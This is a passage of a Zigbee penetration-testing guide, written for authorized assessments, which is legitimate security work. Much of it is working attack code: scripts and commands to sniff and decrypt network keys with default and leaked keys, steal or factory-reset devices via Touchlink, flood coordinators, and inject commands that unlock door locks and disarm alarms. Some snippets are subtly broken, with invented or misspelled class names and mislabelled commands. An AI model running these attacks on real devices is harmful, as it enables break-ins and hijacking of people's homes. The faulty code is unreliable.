python3 ack_attack.py -c 11 --target 0xABCD

# Insecure rejoin — attempt to join network without credentials
python3 insecure_rejoin.py -c 11 --pan_id 0x1234

# Device steal (Touchlink)
python3 z3sec_touchlink.py scan -c 11
```

### 9.3 Z3sec (IoTsec / FAU Research Group)

**GitHub:** https://github.com/IoTsec/Z3sec  
**Research Paper:** "Insecure to the Touch: Attacking ZigBee 3.0 via Touchlink Commissioning" (WiSec 2017)  
**Authors:** Moritz Müller, Florian Lautenschlager, Zinaida Benenson (Friedrich-Alexander University)  
**Hardware:** Ettus USRP B200/B210 OR KillerBee-compatible hardware  
**Language:** Python + GNU Radio  
**Specialization:** Touchlink commissioning attacks, key extraction, device control

**Installation:**
```bash
git clone https://github.com/IoTsec/Z3sec
cd Z3sec

# Install dependencies
sudo apt-get install gnuradio python3-scapy tcpdump
pip3 install pyzmq

# Install Z3sec
sudo python3 setup.py install

# Add ZLL master key (leaked key)
# Edit ~/.config/z3sec/touchlink_crypt.ini after first run:
# zll_master_key = 9F5595F10257C8A965370BC22A8B0244
```

**Z3sec Tools:**
```bash
# z3sec_touchlink — Touchlink commissioning attack tool

# Scan for touchlink-enabled devices (within range)
z3sec_touchlink scan -c 11 [--kb /dev/ttyUSBX | --sdr]

# Factory reset target device (!)
z3sec_touchlink reset_factory -c 11 --target 0x001BFFFF00000001 --sdr

# Steal device into your network
z3sec_touchlink join_network -c 11 --target EUI64 --new_pan 0x9999 --sdr

# Change target device's channel (network disruption)
z3sec_touchlink change_channel -c 11 --target EUI64 --new_channel 15 --sdr

# z3sec_key_extract — Extract network key from touchlink commissioning
# Passive: listen for key exchange
z3sec_key_extract --channel 11 --kb /dev/ttyUSBX

# From pcap file
z3sec_key_extract --pcap capture.pcap

# z3sec_control — Send commands to controlled devices
# (after obtaining network key)
z3sec_control -c 11 --dst 0xABCD --cmd on_off --value off --key NETWORK_KEY_HEX
```

### 9.4 Z-Fuzzer

**GitHub:** https://github.com/zigbeeprotocol/Z-Fuzzer  
**Paper:** "Security Analysis of Zigbee Protocol Implementation via Device-agnostic Fuzzing" (ACM DTRAP 2022)  
**Purpose:** Fuzz testing of Zigbee protocol stack implementations  
**Discovered:** 6 previously unknown vulnerabilities in TI Z-Stack; 3 CVEs assigned (CVSS 7.5–8.2)

```bash
git clone https://github.com/zigbeeprotocol/Z-Fuzzer
cd Z-Fuzzer
pip3 install -r requirements.txt
python3 zfuzzer.py --target Z-Stack --protocol NWK --duration 3600
```

### 9.5 Zigator

**GitHub:** https://github.com/akestoridis/zigator  
**Purpose:** Security analysis tool for encrypted Zigbee traffic; supports selective jamming and spoofing analysis  
**Paper:** Presented by Dimitrios-Georgios Akestoridis

```bash
pip3 install zigator
zigator analyze capture.pcap --network-key AABBCCDDEEFF00112233445566778899
```

### 9.6 Zigbee2MQTT (Dual-Use: Legitimate + Research)

**GitHub:** https://github.com/Koenkk/zigbee2mqtt  
**Use Case:** Full Zigbee coordinator platform with MQTT bridge; useful for authorized network assessment, device enumeration, and ZCL cluster testing

```bash
# Run via Docker
docker run -it --device=/dev/ttyUSB0 \
  -v $(pwd)/data:/app/data \
  -e ZIGBEE2MQTT_DATA=/app/data \
  koenkk/zigbee2mqtt

# Access dashboard at http://localhost:8080
# All paired devices visible with endpoints, clusters, values
```

### 9.7 SecBee (Cognosec)

**GitHub:** https://github.com/Cognosec/SecBee (archived)  
**Purpose:** Zigbee security testing focusing on key distribution, authentication, and authorization  
**Status:** Archived; useful as reference implementation

### 9.8 Scapy with IEEE 802.15.4 / Zigbee Layers

Scapy includes built-in support for IEEE 802.15.4 and Zigbee protocols:

```python
from scapy.all import *
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *

# Parse a captured Zigbee frame
pkt = Dot15d4(bytes.fromhex('618800FFFF...'))
pkt.show()

# Craft a Zigbee beacon request
beacon_req = Dot15d4(fcf_frametype=0x01, fcf_ackreq=0, fcf_destaddrmode=2) / \
             Dot15d4Data(dest_panid=0xFFFF, dest_addr=0xFFFF) / \
             ZigbeeNWK()

# Send via KillerBee interface
sendp(beacon_req, iface='zigbee0')
```

### 9.9 Supporting Tools Summary

| Tool | Purpose | URL |
|------|---------|-----|
| Wireshark | Packet analysis with Zigbee dissectors | https://www.wireshark.org |
| SmartRF Packet Sniffer 2 | TI's official 802.15.4 sniffer (Windows) | https://www.ti.com/tool/PACKET-SNIFFER |
| ZBOSS Sniffer | Cross-platform sniffer firmware for CC2531 | https://zboss.dsr-wireless.com/tools/zboss-sniffer |
| deCONZ | Dresden Elektronik Zigbee GUI + REST API | https://www.phoscon.de/deconz |
| GoodFET | JTAG/chip extraction; zbgoodfind integration | https://goodfet.sourceforge.net |
| Binwalk | Firmware extraction and analysis | https://github.com/ReFirmLabs/binwalk |
| Firmwalker | Firmware security scanner | https://github.com/craigz28/firmwalker |
| URH (Universal Radio Hacker) | RF protocol reverse engineering | https://github.com/jopohl/urh |
| Boofuzz | Network protocol fuzzer | https://github.com/jtpereyda/boofuzz |
| Home Assistant | Authorized network assessment dashboard | https://www.home-assistant.io |

---

## 10. Pre-Engagement & Scoping

### 10.1 Authorization Checklist

```
[ ] Written authorization from device/network owner
[ ] List of in-scope PAN IDs and channels
[ ] Physical locations where RF testing is permitted
[ ] Time windows (avoid alarm-triggering attacks during occupied hours)
[ ] Emergency stop procedure (know how to halt testing immediately)
[ ] Exclusions (e.g., do not reset production devices to factory defaults)
[ ] Data handling agreement for captured encrypted traffic
[ ] FCC/regional RF compliance confirmation
[ ] Building management notification if required
[ ] Confirmation that testing won't affect neighbor Zigbee networks
```

### 10.2 Threat Modeling (STRIDE Applied to Zigbee)

| STRIDE | Zigbee Threat |
|--------|--------------|
| **S**poofing | Rogue coordinator, device impersonation, EUI-64 cloning |
| **T**ampering | ZCL command injection, routing table manipulation, OTA compromise |
| **R**epudiation | RF commands leave no audit trail |
| **I**nformation Disclosure | Network key interception, traffic analysis, default key exploitation |
| **D**enial of Service | PAN ID flood, ACK attack, beacon flood, selective jamming |
| **E**levation of Privilege | Gaining Trust Center authority, bypassing authentication |

### 10.3 OSINT Gathering

```bash
# FCC ID search (reveals internal photos, frequency, manufacturer)
# Navigate to: https://fccid.io
# Search model number or brand

# Zigbee product database (CSA Alliance)
# https://csa-iot.org/csa-iot_products/

# Check firmware versions against known CVEs
# https://nvd.nist.gov/vuln/search  (search: "zigbee" OR "cc2531" OR "z-stack")

# Shodan IoT search for Zigbee gateways
# https://www.shodan.io  (search: "zigbee2mqtt" OR "deconz" port:80,8080,8443)
```

---

## 11. Phase 1 — Passive Reconnaissance & Sniffing

### 11.1 Multi-Channel Survey

Zigbee networks can operate on any of 16 channels. Scan all channels first.

```bash
# Method 1: KillerBee zbstumbler (scans all channels)
zbstumbler -v 2>&1 | tee zigbee_discovery.txt

# Method 2: Manual channel sweep with zbdump
for CH in $(seq 11 26); do
    echo "[+] Scanning channel $CH..."
    timeout 10 zbdump -c $CH -w channel_${CH}.pcap
done

# Method 3: zbwireshark live view channel 15
zbwireshark -c 15 &
wireshark -k -i /tmp/zigbee-pipe &
# In Wireshark: Apply filter → zbee_nwk
```

**Expected output from zbstumbler:**
```
[11] Beacon from 0x0000 on PAN:0xABCD (coordinator)
[15] Beacon from 0x1234 on PAN:0x1A2B (router, assoc permitted)
[20] Beacon from 0x5678 on PAN:0x3C4D
```

### 11.2 Passive Capture & Decryption

```bash
# Capture all traffic on discovered channel
zbdump -c 15 -w capture_ch15.pcap -t 300    # 5-minute capture

# Attempt key sniffing — captures key transport frames
zbdsniff -c 15 -w capture_with_keys.pcap -t 600

# Open in Wireshark with default TCLK
# Edit → Preferences → Protocols → Zigbee NWK → Add key:
# 5A6967426565416C6C69616E636530 39    (ZigBeeAlliance09 — hex)
# 9F5595F10257C8A965370BC22A8B0244     (ZLL leaked master key)
```

**Wireshark Zigbee filters:**
```
zbee_nwk              # All Zigbee NWK frames
zbee_aps              # APS layer frames
zbee_zcl              # ZCL frames (application commands)
zbee_nwk.security==1  # Encrypted frames only
zbee_zcl.cluster_id==0x0101  # Door Lock cluster
zbee_nwk.src==0x0000  # From coordinator only
```

### 11.3 What to Identify in Captured Traffic

**From unencrypted frames:**
- PAN IDs of all networks in range
- Short addresses and EUI-64 of all devices
- Network topology from route records
- Device types from ZDO Simple Descriptor responses
- Firmware versions from Basic cluster attribute reads

**From successfully decrypted frames (with default key):**
- All ZCL commands (lock, unlock, on, off, alarm arm/disarm)
- Attribute values (temperature, occupancy, battery levels)
- Network key transport frames (if captured during join)

### Test Cases — Phase 1

| TC-ZB-001 | Multi-Channel Passive Survey |
|-----------|------------------------------|
| **Objective** | Identify all Zigbee networks within RF range |
| **Method** | Passive scan all 16 channels (11–26) |
| **Tool** | KillerBee zbstumbler, zbdump |
| **Hardware** | CC2531 (sniffer mode) or ApiMote |
| **Expected Finding** | PAN IDs, channels, coordinator addresses, associated devices |
| **Risk** | Enables all subsequent targeted attacks |

| TC-ZB-002 | Default Key Traffic Decryption |
|-----------|-------------------------------|
| **Objective** | Decrypt Zigbee traffic using well-known default TCLK |
| **Method** | Capture NWK frames; apply ZigBeeAlliance09 key in Wireshark |
| **Expected Finding** | **CRITICAL** if any application commands visible in plaintext |
| **Pass Criteria (secure):** | All captured traffic unreadable with default key; unique install codes used |
| **CVSS Score** | 8.6 (High) if successful |

| TC-ZB-003 | ZLL Master Key Decryption |
|-----------|--------------------------|
| **Objective** | Decrypt ZLL touchlink commissioning using leaked master key |
| **Method** | Capture touchlink frames; apply leaked ZLL key |
| **Tool** | Z3sec key_extract, Wireshark |
| **Expected Finding** | Network key exposed in commissioning frames |

---

## 12. Phase 2 — Active Network Discovery & Mapping

### 12.1 Beacon Requests (Active Discovery)

```bash
# KillerBee zbstumbler active mode
zbstumbler -c 11 -v -t 30    # Active: sends beacon requests, listens for responses

# Expected output:
# PAN: 0xABCD  Coordinator: 0xFFFF (0x0000 short)  Channel: 11
#   Device: 0x1A2B  EUI: 00:12:4B:00:XX:XX:XX:XX  LQI: 200  RSSI: -65 dBm
#   Device: 0x3C4D  EUI: 00:15:8D:00:XX:XX:XX:XX  LQI: 180  RSSI: -72 dBm
```

### 12.2 ZDO Device Discovery

The Zigbee Device Object (ZDO) exposes device information in mostly-unencrypted management frames:

```python
from killerbee import *
from scapy.all import *
from scapy.layers.zigbee import *

kb = KillerBee(device='/dev/ttyUSBX')
kb.set_channel(15)

# Send ZDO Active Endpoints Request to target
# This reveals all application endpoints on a device
zdo_ae_req = Dot15d4FCS() / Dot15d4Data() / ZigbeeNWK() / \
             ZigbeeAppDataPayload() / ZigbeeDeviceProfile() / \
             ZDPActiveEPReq(nwk_addr=TARGET_SHORT_ADDR)

kb.inject(bytes(zdo_ae_req))

# Listen for ZDO Active Endpoints Response
# Reveals: endpoint list, profile IDs, cluster IDs
```

### 12.3 ZDO Node Descriptor

```python
# ZDO Node Descriptor Request — reveals device type, capabilities, security level
zdo_nd_req = ZDPNodeDescReq(nwk_addr=TARGET_ADDR)
# Response reveals:
# - Device type (coordinator/router/end device)
# - Security capabilities
# - Manufacturer code
# - Max buffer size
# - Max transfer size
```

### 12.4 ZCL Attribute Discovery

```python
# Read Basic Cluster attributes (endpoint 1, always unencrypted)
# Reveals: manufacturer name, model ID, software version, hardware version

basic_cluster_read = ZCLReadAttributesReq(
    attribs=[0x0000,  # ZCL version
             0x0001,  # App version
             0x0002,  # Stack version
             0x0003,  # HW version
             0x0004,  # Manufacturer name
             0x0005,  # Model identifier
             0x0006,  # Date code
             0x0007]  # Power source
)
```

### Test Cases — Phase 2

| TC-ZB-004 | Active PAN Discovery |
|-----------|---------------------|
| **Objective** | Map all Zigbee networks and devices on all channels |
| **Method** | Broadcast beacon requests; parse all responses |
| **Tool** | KillerBee zbstumbler -v |
| **Expected Finding** | Complete device inventory with EUI-64, short addresses, LQI |

| TC-ZB-005 | ZDO Endpoint Enumeration |
|-----------|-------------------------|
| **Objective** | Discover all application endpoints and clusters per device |
| **Method** | ZDO Active Endpoint Request to each discovered node |
| **Expected Finding** | Cluster list reveals device capabilities and attack surface |
| **Note** | ZDO requests can be sent without network key |

| TC-ZB-006 | ZCL Basic Cluster Fingerprinting |
|-----------|----------------------------------|
| **Objective** | Identify device manufacturer, model, and firmware version |
| **Method** | Read Basic Cluster (0x0000) attributes |
| **Expected Finding** | Manufacturer name + model number → lookup for known CVEs |
| **Vulnerability** | Basic cluster reads are often unauthenticated |

---

## 13. Phase 3 — Key Extraction & Cryptographic Attacks

### 13.1 Network Key Sniffing During Join (CRITICAL)

**Prerequisites:** Attacker within RF range of target when new device joins network using default TCLK

**Attack Flow:**
```
1. Attacker enables passive capture on target channel
2. Network administrator adds new device (or device rejoins after reset)
3. New device sends Association Request (unencrypted)
4. Coordinator sends Association Response (unencrypted)
5. Coordinator sends Transport Key frame (ENCRYPTED WITH TCLK)
6. If TCLK = ZigBeeAlliance09: attacker decrypts Transport Key, extracts NWK key
7. Attacker now possesses NWK key → all present and future NWK traffic decryptable
```

**Implementation:**
```python
#!/usr/bin/env python3
# Zigbee Network Key Sniffer
from killerbee import *
from scapy.all import *
from scapy.layers.zigbee import *
from Crypto.Cipher import AES
import binascii

# Default Trust Center Link Key
DEFAULT_TCLK = bytes.fromhex('5A6967426565416C6C69616E636530 39'.replace(' ',''))

class ZigbeeKeySniffer:
    def __init__(self, channel, device):
        self.kb = KillerBee(device=device)
        self.kb.set_channel(channel)
        print(f"[*] Sniffing channel {channel} for key transport frames...")
    
    def decrypt_transport_key(self, encrypted_key, tclk=DEFAULT_TCLK):
        """Decrypt Network Key using TCLK"""
        # AES-128 in ECB mode used for key transport in Zigbee
        cipher = AES.new(tclk, AES.MODE_ECB)
        network_key = cipher.decrypt(encrypted_key)
        return network_key
    
    def run(self):
        while True:
            frame = self.kb.pnext()
            if frame:
                pkt = Dot15d4FCS(frame['bytes'])
                if ZigbeeSecurityHeader in pkt:
                    # Check for key transport (APS Command = 0x05)
                    if hasattr(pkt, 'aps_frametype') and pkt.aps_frametype == 0x01:
                        if hasattr(pkt, 'cmd_identifier') and pkt.cmd_identifier == 0x05:
                            print("[!] Key Transport Frame Detected!")
                            print(f"    From: {pkt[Dot15d4Data].src_addr:#06x}")
                            print(f"    To:   {pkt[Dot15d4Data].dest_addr:#06x}")
                            # Extract and attempt decryption
                            try:
                                encrypted_key = bytes(pkt.key_data)
                                nwk_key = self.decrypt_transport_key(encrypted_key)
                                print(f"[+] NETWORK KEY: {nwk_key.hex()}")
                            except Exception as e:
                                print(f"[-] Decryption failed: {e}")

sniffer = ZigbeeKeySniffer(channel=15, device='/dev/ttyUSBX')
sniffer.run()
```

**KillerBee zbdsniff (automated):**
```bash
# zbdsniff automatically detects and extracts keys
zbdsniff -c 15 -w capture.pcap

# When key found:
# Key: 5A6967426565416C6C69616E636530 39 (identifies as default ZigBeeAlliance09)
# Key: AB12CD34EF56789000112233445566 78 (actual NWK key if captured during join)
```

### 13.2 ZLL Key Extraction (Z3sec)

```bash
# Passive extraction: listen for ZLL commissioning on channel 11
z3sec_key_extract --channel 11 --kb /dev/ttyUSBX

# From existing pcap (with leaked ZLL master key in config)
z3sec_key_extract --pcap capture.pcap

# Expected output:
# [+] Detected ZLL key transport frame
# [+] Decrypted Network Key: AABBCCDDEEFF00112233445566778899
# [+] Target EUI-64: 00:17:88:XX:XX:XX:XX:XX
```

### 13.3 Key Extraction from Memory Dump (zbgoodfind)

After physical access to a device, extract firmware/NVM and search for keys:

```bash
# Step 1: Dump device NVM/flash (see Phase 10 for hardware methods)
# Step 2: Use zbgoodfind to locate key material
zbgoodfind -p capture.pcap -m nvm_dump.bin
# zbgoodfind tests each possible 16-byte block in memdump as a potential key
# and verifies against captured encrypted traffic

# Step 3: Manual search for AES key patterns
python3 -c "
with open('nvm_dump.bin', 'rb') as f:
    data = f.read()
# Common NWK key storage offset for TI Z-Stack
# Z-Stack 3.x stores NWK key at NV_NWKKEY_ID offset in NVM
for i in range(0, len(data)-16, 4):
    block = data[i:i+16]
    if block not in [b'\\xff'*16, b'\\x00'*16]:
        entropy = len(set(block))
        if entropy > 10:  # High entropy = likely key material
            print(f'Potential key @ 0x{i:06x}: {block.hex()}')
"
```

### 13.4 Install Code Attack

If install codes are used but the code label is physically accessible:

```bash
# Install codes are 16 bytes with 2-byte CRC (printed as QR or on device label)
# Example: 83FED3407A939723A5C639B26916D505C3B5
#          (16 data bytes + 2 CRC bytes)

# Derive link key from install code using MMO hash
python3 -c "
from zigpy.zcl.foundation import ZCLHeader  # zigpy library
from zigpy.config.config_validation import convert_install_code

install_code = bytes.fromhex('83FED3407A939723A5C639B26916D505C3B5')
link_key = convert_install_code(install_code)
print(f'Derived Link Key: {link_key.hex()}')
"
```

### Test Cases — Phase 3

| TC-ZB-007 | Network Key Interception During Join |
|-----------|-------------------------------------|
| **Objective** | Capture NWK key from key transport frame during device join |
| **Prerequisites** | Default TCLK in use (`ZigBeeAlliance09`); attacker present during join |
| **Tool** | KillerBee zbdsniff, Z3sec key_extract |
| **Expected Finding** | Network key obtained; **all NWK traffic permanently decryptable** |
| **CVSS Score** | 9.1 (Critical) |
| **Remediation** | Enforce install codes; use unique per-device TCLK |

| TC-ZB-008 | Default TCLK Enforcement Verification |
|-----------|--------------------------------------|
| **Objective** | Verify coordinator enforces unique install codes vs default key |
| **Method** | Attempt to join with a device using `ZigBeeAlliance09` key |
| **Tool** | ApiMote + KillerBee custom join script |
| **Pass Criteria (secure):** | Coordinator rejects join using default TCLK |
| **Fail (vulnerable):** | Coordinator accepts join with default key |

| TC-ZB-009 | ZLL Master Key Exploitation |
|-----------|----------------------------|
| **Objective** | Extract NWK key from ZLL commissioning using leaked master key |
| **Prerequisites** | Target has ZLL-enabled device; Z3sec with leaked key configured |
| **Tool** | Z3sec z3sec_key_extract |
| **Expected Finding** | Network key extracted from passive commissioning capture |
| **Remediation** | Disable Touchlink on ZLL devices; no Zigbee 3.0 fix possible (master key is publicly leaked) |

| TC-ZB-010 | Install Code Physical Security |
|-----------|-------------------------------|
| **Objective** | Assess physical exposure of install codes on device labels |
| **Method** | Physical inspection of device packaging/labels; scan QR codes |
| **Expected Finding** | Install code visible → attacker derives unique TCLK |
| **Remediation** | Remove install code label after pairing; use NFC provisioning |

---

## 14. Phase 4 — Touchlink Commissioning Attacks

### 14.1 Overview of Touchlink Security Weaknesses

Touchlink commissioning (ZLL and optional in Zigbee 3.0) has multiple critical weaknesses:
1. **Proximity check** relies only on received signal strength (RSSI) — bypassable with directional antenna
2. **ZLL Master Key leaked March 2015** — permanently breaks Touchlink encryption
3. **No mutual authentication** — initiator does not need to prove network membership
4. **Factory reset** possible without any authentication (proximity only)

**Attacker requirement:** RF reach of target device. With high-gain antenna: 130+ meters demonstrated.

### 14.2 Touchlink Scan (Device Discovery)

```bash
# Discover all touchlink-capable devices on channel 11
z3sec_touchlink scan --channel 11 --sdr

# Or with KillerBee hardware:
z3sec_touchlink scan --channel 11 --kb /dev/ttyUSBX

# Output:
# [+] Scan Response from: 00:17:88:01:XX:XX:XX:XX (Philips Hue)
#     PAN ID: 0xABCD, Network Address: 0x1A2B, Device type: Light
# [+] Scan Response from: 00:0D:6F:XX:XX:XX:XX:XX (LEDVANCE)
#     PAN ID: 0x9876, Network Address: 0x5678, Device type: Light
```

### 14.3 Factory Reset Attack

**Impact:** Resets target device to factory defaults, removing it from its current network. Extremely disruptive — all configuration and pairings lost.

```bash
# Factory reset specific device (by EUI-64)
z3sec_touchlink reset_factory --channel 11 \
  --target 00:17:88:01:XX:XX:XX:XX --sdr

# With impersonation (some devices require ACK from another network member)
# First scan to get a neighboring device address:
z3sec_touchlink scan --channel 11 --sdr
# Then use --src_addr of a known network member:
z3sec_touchlink reset_factory --channel 11 \
  --target TARGET_EUI --src_addr 0x1234 \
  --src_addr_ext NEIGHBOR_EUI --src_pan_id 0xABCD --sdr
```

### 14.4 Device Theft (Join Attacker Network)

**Impact:** Device removed from legitimate network and added to attacker-controlled network.

```bash
# Steal device into attacker-controlled network
z3sec_touchlink join_network --channel 11 \
  --target 00:17:88:01:XX:XX:XX:XX \
  --new_pan_id 0x1337 \
  --new_channel 20 \
  --sdr

# After theft:
# - Device responds to attacker's commands
# - Device no longer responds to legitimate network
# - Legitimate network shows device as offline
```

### 14.5 Channel Change Attack (Network Disruption)

```bash
# Force device to change channel, disrupting network
z3sec_touchlink change_channel --channel 11 \
  --target TARGET_EUI \
  --new_channel 25 --sdr

# Impact: Device on channel 25, network on channel 11 = device isolated
```

### 14.6 Identify Attack (Low Risk, High Visibility)

```bash
# Force device to enter identify mode (flashes lights, beeps)
z3sec_touchlink identify --channel 11 \
  --target TARGET_EUI --duration 65535 --sdr
# Duration 65535 = continuous identification until stopped
```

### 14.7 ZigDiggity Touchlink / Device Steal

```bash
# Using ZigDiggity on Raspberry Pi + RaspBee
python3 steal_device.py -c 11 --target EUI64_HERE

# scan mode first
python3 beacon.py -c 11   # Identify networks
```

### Test Cases — Phase 4

| TC-ZB-011 | Touchlink Factory Reset |
|-----------|------------------------|
| **Objective** | Reset Zigbee device to factory defaults via Touchlink |
| **Prerequisites** | Device supports Touchlink; attacker within RF range |
| **Tool** | Z3sec z3sec_touchlink reset_factory |
| **Expected Finding** | Device reset, removed from network, all config lost |
| **CVSS Score** | 7.5 (High) |
| **Remediation** | Disable Touchlink on devices; update to Zigbee 3.0 centralized security |

| TC-ZB-012 | Touchlink Device Theft |
|-----------|----------------------|
| **Objective** | Steal device from legitimate network into attacker network |
| **Tool** | Z3sec z3sec_touchlink join_network |
| **Expected Finding** | Device joins attacker network; legitimate network loses control |
| **CVSS Score** | 8.8 (High) |

| TC-ZB-013 | Long-Range Touchlink Attack |
|-----------|----------------------------|
| **Objective** | Execute Touchlink attack beyond proximity threshold using directional antenna |
| **Method** | High-gain directional antenna + USRP/HackRF; Z3sec SDR mode |
| **Expected Finding** | Touchlink attacks possible from 100+ meters |
| **Note** | Demonstrated by researchers at FAU; 130m range in lab conditions |

| TC-ZB-014 | Touchlink Disable Verification |
|-----------|-------------------------------|
| **Objective** | Verify devices have Touchlink disabled |
| **Method** | Send Touchlink Scan Request; verify no response |
| **Pass Criteria (secure):** | No Scan Response received |

---

## 15. Phase 5 — Network Joining & Rejoining Attacks

### 15.1 Insecure Rejoin Attack

**Background:** When a device loses connection to its network, it can perform a "rejoin." Zigbee allows **unsecured** rejoin (without NWK key) as a fallback mechanism. An attacker can exploit this to inject a rogue device.

```python
# ZigDiggity insecure_rejoin.py
python3 insecure_rejoin.py -c 15 --pan_id 0xABCD --src 0x1234
# Attempts to rejoin target PAN ID using unsecured rejoin
# If coordinator allows: attacker gains network membership
```

**Research reference:** "Zigbee's Network Rejoin Procedure for IoT Systems: Vulnerabilities and Implications" (RAID 2022, Wang et al.)

### 15.2 Rogue Coordinator Attack

If the attacker can form a network with the same PAN ID on the same channel before the legitimate coordinator, devices resetting may join the rogue network.

```python
from killerbee import *
from scapy.all import *
from scapy.layers.zigbee import *

# Form rogue coordinator on target PAN ID
def form_rogue_coordinator(channel, pan_id, target_key):
    kb = KillerBee(device='/dev/ttyUSBX')
    kb.set_channel(channel)
    
    # Send beacon advertising the target PAN ID with association permitted
    beacon = Dot15d4(fcf_frametype=0x00, fcf_panidcompress=0) / \
             Dot15d4Beacon(sf_beaconorder=15, sf_assocpermit=1) / \
             ZigbeeBeacon(pan_id=pan_id)
    
    while True:
        kb.inject(bytes(beacon))
        time.sleep(0.1)
```

### 15.3 Association Flood

```python
# Flood coordinator with association requests from random EUI-64s
# Can exhaust coordinator's device table
import random
import time
from killerbee import *

def association_flood(channel, pan_id):
    kb = KillerBee(device='/dev/ttyUSBX')
    kb.set_channel(channel)
    
    while True:
        random_eui = random.getrandbits(64).to_bytes(8, 'little')
        assoc_req = Dot15d4FCS() / \
                    Dot15d4Data(dest_panid=pan_id, dest_addr=0xFFFF,
                               src_panid=0xFFFF, src_addr=random_eui) / \
                    ZigbeeNWK() / ZigbeeMACCmdAssocReq()
        kb.inject(bytes(assoc_req))
        time.sleep(0.01)
```

### Test Cases — Phase 5

| TC-ZB-015 | Insecure Rejoin Test |
|-----------|---------------------|
| **Objective** | Test if coordinator allows unsecured device rejoin |
| **Method** | Send ZigDiggity insecure_rejoin with known PAN ID |
| **Expected Finding** | Vulnerable: coordinator grants network key; Secure: rejected |
| **Tool** | ZigDiggity insecure_rejoin.py |
| **Remediation** | Require secured rejoin only; disable unsecured rejoin fallback |

| TC-ZB-016 | Rogue Coordinator Detection |
|-----------|----------------------------|
| **Objective** | Test whether devices will join rogue coordinator |
| **Method** | Set up rogue coordinator on same PAN ID; factory-reset a test device |
| **Expected Finding** | Vulnerable: device joins rogue coordinator |
| **Remediation** | Install codes prevent this; centralized security model required |

---

## 16. Phase 6 — Application Layer & ZCL Attacks

### 16.1 Unauthenticated ZCL Command Injection

Many consumer Zigbee devices accept ZCL commands without verifying that the source is an authorized network member, or without APS-layer link key encryption.

```python
#!/usr/bin/env python3
# ZCL Command Injection via KillerBee
from killerbee import *
from scapy.all import *
from scapy.layers.zigbee import *

def send_zcl_command(channel, pan_id, dst_short, src_short,
                     dst_ep, src_ep, cluster_id, cmd_id, payload,
                     network_key=None):
    kb = KillerBee(device='/dev/ttyUSBX')
    kb.set_channel(channel)
    
    # Build frame (NWK-layer encrypted if key available)
    frame = Dot15d4FCS() / \
            Dot15d4Data(dest_panid=pan_id, dest_addr=dst_short,
                       src_panid=pan_id, src_addr=src_short) / \
            ZigbeeNWK(destination=dst_short, source=src_short,
                     proto_version=2, discover_route=0) / \
            ZigbeeAppDataPayload(dst_endpoint=dst_ep, src_endpoint=src_ep,
                                cluster=cluster_id) / \
            ZigbeeClusterLibrary(zcl_frametype=0x01, command_identifier=cmd_id,
                                direction=0) / \
            Raw(payload)
    
    kb.inject(bytes(frame))
    print(f"[+] Injected ZCL cmd {cmd_id:#04x} to cluster {cluster_id:#06x}")

# Example: On/Off cluster — turn off a smart plug
send_zcl_command(
    channel=15, pan_id=0xABCD,
    dst_short=0x1234, src_short=0x0000,
    dst_ep=1, src_ep=1,
    cluster_id=0x0006,  # On/Off
    cmd_id=0x00,        # Off command
    payload=b''
)

# Example: Door Lock — attempt unlock (0x01 = Unlock)
send_zcl_command(
    channel=15, pan_id=0xABCD,
    dst_short=LOCK_ADDR, src_short=0x0000,
    dst_ep=1, src_ep=1,
    cluster_id=0x0101,  # Door Lock
    cmd_id=0x01,        # Unlock Door
    payload=b''         # No PIN (test if PIN enforced)
)
```

### 16.2 IAS Zone Cluster Attack (Alarm Bypass)

The Intrusion Alarm System (IAS) cluster is used for door/window sensors, motion detectors, and alarm zones.

```python
# IAS Zone Type — Enroll Response (bypass zone enrollment)
# Attack: Send IAS Zone Enroll Response to hijack a sensor

ias_enroll = ZCLClusterLibrary(
    zcl_frametype=0x01,
    command_identifier=0x00,  # Zone Enroll Response
    direction=0
) / Raw(b'\x00\x00')  # Enroll result: Success, Zone ID: 0

# IAS ACE (Armed Control Equipment) attack
# Attempt to disarm alarm by sending ZCL command to IAS ACE cluster
ias_disarm = ZCLClusterLibrary(
    zcl_frametype=0x01,
    command_identifier=0x00,  # Arm command
    direction=0
) / ZDPArmReq(arm_mode=0x00,  # Disarm
              arm_disarm_code=b'0000',
              zone_id=0x00)
```

### 16.3 ACM CCS 2022 "Beehive" Attacks (Wang & Hao)

Researchers at ACM CCS 2022 ("Don't Kick Over the Beehive") identified 5 attack types against real-world Zigbee systems:

**Attack 1: Communication Interruption via ZCL Cluster ID**
- Sending specific ZCL cluster IDs causes devices to stop responding for extended periods
- Demonstrated on 6 of 10 tested Zigbee systems
- Triggered within 25 seconds

**Attack 2: Device Silence (Network Membership Attack)**
- Devices can be forced silent by sending crafted frames that trigger error handling
- Target device stops sending responses while controller believes it's still connected

**Attack 3: Key Exposure Trigger**
- Sending specific commands triggers the device to expose its encryption key
- Allows full network traffic decryption afterward

**Attack 4: Improper Integrity Check Bypass**
- Frames with security enabled bit=1 but malformed security header accepted by some implementations

**Attack 5: Truncated Packet Attack**
- Sending truncated NWK header frames causes target devices to halt

```python
# Implementation of communication interruption (Attack 1)
# Craft ZCL frame with specific cluster ID that triggers device lockup
def communication_interrupt(channel, pan_id, target_addr, lockup_cluster_id):
    """
    Send specific cluster ID that causes device communication interruption.
    Cluster IDs discovered by Wang & Hao through testing; device-specific.
    Perform this test on authorized devices to identify vulnerable cluster IDs.
    """
    kb = KillerBee(device='/dev/ttyUSBX')
    kb.set_channel(channel)
    
    interrupt_frame = (Dot15d4FCS() /
                      Dot15d4Data(dest_addr=target_addr) /
                      ZigbeeNWK(destination=target_addr) /
                      ZigbeeAppDataPayload(cluster=lockup_cluster_id, dst_endpoint=1) /
                      ZigbeeClusterLibrary(zcl_frametype=0x00))
    
    kb.inject(bytes(interrupt_frame))
```

### Test Cases — Phase 6

| TC-ZB-017 | Unauthenticated ZCL Command Injection |
|-----------|--------------------------------------|
| **Objective** | Control actuator without proper authentication |
| **Method** | Inject ZCL On/Off, Door Lock, or IAS commands without NWK/APS key |
| **Tool** | KillerBee + custom Scapy script |
| **Expected Finding** | **CRITICAL** if device executes unauthenticated commands |
| **CVSS Score** | 9.8 (Critical) if door lock responds |

| TC-ZB-018 | IAS Alarm Bypass |
|-----------|-----------------|
| **Objective** | Disarm security alarm via spoofed IAS ACE command |
| **Method** | Send IAS ACE Arm (disarm) command to alarm system |
| **Expected Finding** | Vulnerable: alarm disarmed; Secure: PIN required and enforced |
| **CVSS Score** | 9.1 (Critical) |

| TC-ZB-019 | ZCL Cluster Communication Interruption |
|-----------|---------------------------------------|
| **Objective** | Cause device to stop communicating with controller via ZCL |
